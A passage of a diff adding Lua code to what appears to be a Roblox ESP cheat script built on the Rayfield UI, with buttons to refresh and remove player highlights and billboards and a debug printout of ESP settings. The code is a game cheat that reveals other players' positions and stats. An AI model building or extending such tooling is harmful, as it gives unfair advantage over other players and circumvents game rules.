+        for player, data in pairs(espData) do
+            if data and data.highlight then data.highlight:Destroy() end
+            if data and data.billboard then data.billboard:Destroy() end
+        end
+        espData = {}
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                task.spawn(function() createESP(player) end)
+            end
+        end
+    end
+})
+
+UtilityTab:CreateButton({
+    Name = "Destroy UI",
+    Callback = function()
+        for player, data in pairs(espData) do
+            if data and data.highlight then data.highlight:Destroy() end
+            if data and data.billboard then data.billboard:Destroy() end
+        end
+        espData = {}
+        Rayfield:Destroy()
+    end
+})
+
+-- Update your existing loop to include this:
+-- local uptime = workspace.DistributedGameTime
+-- local hrs = math.floor(uptime / 3600)
+-- local mins = math.floor((uptime % 3600) / 60)
+-- local secs = math.floor(uptime % 60)
+-- UptimeLabel:Set(string.format("Server Uptime: %dh %dm %ds", hrs, mins, secs))
+
+-- Debug button
+UtilityTab:CreateButton({
+    Name = "Debug Info",
+    Callback = function()
+        print("[ESP DEBUG] ================")
+        print("ESP Enabled:", ESP_SETTINGS.ENABLED)
+        
+        -- Count players with ESP
+        local espCount = 0
+        for _ in pairs(espData) do 
+            espCount = espCount + 1 
+        end
+        print("Players with ESP data:", espCount)
+        
+        print("Total players in game:", #Players:GetPlayers())
+        print("LocalPlayer:", LocalPlayer.Name)
+        
+        -- Count how many ESP objects are actually active
+        local activeHighlights = 0
+        local activeBillboards = 0
+        
+        if espCount > 0 then
+            print("\n[ESP DETAILS]")
+            for player, data in pairs(espData) do
+                print("Player:", player.Name)
+                print("  Character exists:", data.character and data.character.Parent ~= nil)
+                print("  Highlight exists:", data.highlight ~= nil)
+                if data.highlight then
+                    print("  Highlight enabled:", data.highlight.Enabled)
+                    print("  Highlight color:", data.highlight.FillColor)
+                    if data.highlight.Enabled then
+                        activeHighlights = activeHighlights + 1
+                    end
+                end
+                print("  Billboard exists:", data.billboard ~= nil)
+                if data.billboard then
+                    print("  Billboard enabled:", data.billboard.Enabled)
+                    if data.billboard.Enabled then
+                        activeBillboards = activeBillboards + 1
+                    end
+                end
+                print("---")
+            end
+        else
+            print("No ESP data found!")
+        end
+        
+        print("\n[ESP SUMMARY]")
+        print("Active Highlights:", activeHighlights)
+        print("Active Billboards:", activeBillboards)
+        print("ESP Settings:")
+        print("  MAX_DISTANCE:", ESP_SETTINGS.MAX_DISTANCE)
+        print("  SHOW_ENEMIES:", ESP_SETTINGS.SHOW_ENEMIES)
+        print("  SHOW_TEAMMATES:", ESP_SETTINGS.SHOW_TEAMMATES)
+        print("  SHOW_NAMES:", ESP_SETTINGS.SHOW_NAMES)
+        print("  SHOW_HEALTH:", ESP_SETTINGS.SHOW_HEALTH)
+        print("  SHOW_DISTANCE:", ESP_SETTINGS.SHOW_DISTANCE)
+        print("========================")
+        
+        -- Show notification with summary
+        Rayfield:Notify({
+            Title = "ESP Debug",
+            Content = string.format("ESP: %s | Active: %d/%d", 
+                ESP_SETTINGS.ENABLED and "ON" or "OFF", 
+                activeHighlights, 
+                espCount),
+            Duration = 5,
+            Image = 4483362458
+        })
+    end
+})
+
+-- Put this at the VERY BOTTOM of your script
+Rayfield:LoadConfiguration()
